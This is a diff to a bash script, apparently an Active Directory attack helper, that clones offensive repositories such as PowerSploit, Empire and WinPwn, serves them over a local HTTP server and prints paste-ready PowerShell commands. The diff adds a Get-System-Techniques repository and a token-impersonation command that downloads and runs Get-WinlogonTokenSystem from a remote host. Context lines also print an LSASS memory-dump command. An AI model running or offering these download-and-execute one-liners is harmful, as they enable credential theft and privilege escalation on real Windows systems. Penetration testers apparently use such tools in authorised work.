@@ -29,8 +29,9 @@ PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSy
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
 S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
-SecListsRepo="https://github.com/danielmiessler/SecLists";
-JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master";
+GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
+SecListsRepo="https://github.com/danielmiessler/SecLists/";
+JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
 
 
 
@@ -102,6 +103,7 @@ NishangLocalRepo="$HOME/ADAT/nishang"
 PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
 WinPwnLocalRepo="$HOME/ADAT/WinPwn"
 JAWSLocalRepo="$HOME/ADAT/JAWS"
+GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
 
 
 if [ -d "$EmpireLocalRepo" ] 
@@ -177,12 +179,26 @@ else
 	echo -e ""
 fi
 
+if [ -d "$GetSystemTechniquesLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "Get-System-Techniques is installed, checking if updated to latest version."
+    	cd $GetSystemTechniquesLocalRepo
+    	git pull "https://github.com/S3cur3Th1sSh1t/Get-System-Techniques.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning Get-System-Techniques Repo${RESTORE}"
+	git clone --recursive "https://github.com/S3cur3Th1sSh1t/Get-System-Techniques.git" $HOME/ADAT/Get-System-Techniques
+	echo -e ""
+fi
 
 cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo
 
 python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
 
@@ -254,6 +270,7 @@ while [ $# -gt 0 ]; do
 		PowerSploitRepo="http://$LocalIP:$LocalPort/"
 		S3cur3Th1sSh1tRepo="http://$LocalIP:$LocalPort/"
 		JAWSRepo="http://$LocalIP:$LocalPort/"
+		GetSystemTechniquesRepo="http://$LocalIP:$LocalPort/"
 		LocalRepo="True"
 		Function_LocalRepo;
                 shift
@@ -783,7 +800,20 @@ echo -e "${IBLUE}Out-Minidump${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"collection/Out-Minidump.ps1);Get-Process lsass | Out-Minidump"
 echo -e ""
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e ""
 
+echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e "										${LGREEN} Token Impersonation ${RESTORE}"
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+#Clipboard
+echo -e "" 
+echo -e "${LGREEN}Create Process with Token${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Get-WinlogonTokenSystem${RESTORE}"
+echo -e "$DownloadMethod "$GetSystemTechniquesRepo"TokenManipulation/Get-WinlogonTokenSystem.ps1.ps1);Get-WinlogonTokenSystem"
+echo -e ""
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 ################################################################################
 # Cleanup	                                                               #
 ################################################################################
